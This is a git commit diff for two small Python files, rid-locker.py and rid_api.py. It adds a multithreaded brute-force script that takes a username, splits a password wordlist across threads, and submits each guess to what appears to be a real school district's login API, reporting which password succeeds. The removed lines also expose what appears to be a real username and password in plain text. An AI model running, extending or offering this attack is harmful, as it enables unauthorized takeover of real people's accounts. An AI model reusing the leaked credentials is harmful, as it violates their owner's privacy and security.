10a413faf7ffa452cf5e0219724a0a666461c51a
Ben Rogozinski <brogodev@gmail.com>
2022-11-13 16:57:40 +0000

    e

--- rid-locker.py
+++ rid-locker.py
@@ -1,11 +1,19 @@
 import requests
 import rid_api
 from threading import Thread
+from itertools import islice
+
+username = input("Username:")
+thread_count = int(input("Number of threads:"))
+words_per_thread = int(input("Passwords per thread:"))
 
 api_url = "https://portal.id.cps.edu/api/rest/authn"
+wordlist = 'all_in_one_w'
 session = requests.session()
 
-thread = Thread(target=rid_api.test_creds, args=(session, api_url, "brogozinski", "Creeper10227"))
-thread.start()
-
-#rid_api.test_creds(session, api_url, "bogozinski", "Creeper10227")
+with open(wordlist) as f:
+    for i in range(0,thread_count):
+        next_n_lines = list(islice(f, words_per_thread))
+        if not next_n_lines:
+            break
+        Thread(target=rid_api.test_list, args=(requests.session(), api_url, username, next_n_lines)).start()
--- rid_api.py
+++ rid_api.py
@@ -8,4 +8,8 @@ def test_creds(s, url, username, password):
         'username' : username,
         'password' : password
     }).json()['type'] == 'complete'
-    print(valid)
+    return valid
+
+def test_list(s, url, username, password_list):
+    for password in password_list:
+        print("Testing", password.strip('\n')[0:30].ljust(30), test_creds(s, url, username, password.strip('\n')))
